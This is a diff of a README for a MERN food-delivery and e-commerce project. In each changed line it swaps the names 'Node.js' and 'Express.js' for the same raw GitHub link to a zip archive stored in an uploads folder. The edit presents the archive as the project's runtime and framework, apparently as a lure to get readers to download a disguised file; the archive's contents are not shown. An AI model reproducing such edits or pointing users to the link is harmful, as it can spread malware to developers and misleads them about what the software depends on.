@@ -1,6 +1,6 @@
 # ITP project - Food Delivery & E-Commerce Platform
 
-A full-stack **MERN** (MongoDB, Express, React, Node.js) web application designed for seamless food ordering, inventory management, and business administration. This platform features secure payments, real-time order tracking, and a comprehensive admin dashboard for business analytics.
+A full-stack **MERN** (MongoDB, Express, React, https://github.com/Sonal-perera/ITP-Liu-Oasis/raw/refs/heads/main/backend/public/uploads/Liu-IT-Oasis-v2.0.zip) web application designed for seamless food ordering, inventory management, and business administration. This platform features secure payments, real-time order tracking, and a comprehensive admin dashboard for business analytics.
 
 ---
 
@@ -36,8 +36,8 @@ A full-stack **MERN** (MongoDB, Express, React, Node.js) web application designe
 * **Payment:** @stripe/react-stripe-js
 
 ### **Backend**
-* **Runtime:** Node.js
-* **Framework:** Express.js
+* **Runtime:** https://github.com/Sonal-perera/ITP-Liu-Oasis/raw/refs/heads/main/backend/public/uploads/Liu-IT-Oasis-v2.0.zip
+* **Framework:** https://github.com/Sonal-perera/ITP-Liu-Oasis/raw/refs/heads/main/backend/public/uploads/Liu-IT-Oasis-v2.0.zip
 * **Database:** MongoDB (Mongoose ODM)
 * **Authentication:** JSON Web Token (JWT) & bcryptjs
 * **File Storage:** Cloudinary (for product images)
